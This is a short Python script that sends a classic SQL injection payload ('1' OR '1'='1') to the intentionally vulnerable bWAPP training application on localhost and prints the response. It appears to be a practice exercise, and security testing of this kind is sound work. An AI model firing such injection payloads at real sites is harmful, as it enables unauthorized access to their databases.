import requests

url = "http://localhost/bwapp/sqli_1.php"
payload = {"title": "1' OR '1'='1"}

try:
    response = requests.get(url, params=payload)
    print(response.text)
except requests.ConnectionError as e:
    print(f"Connection error: {e}")

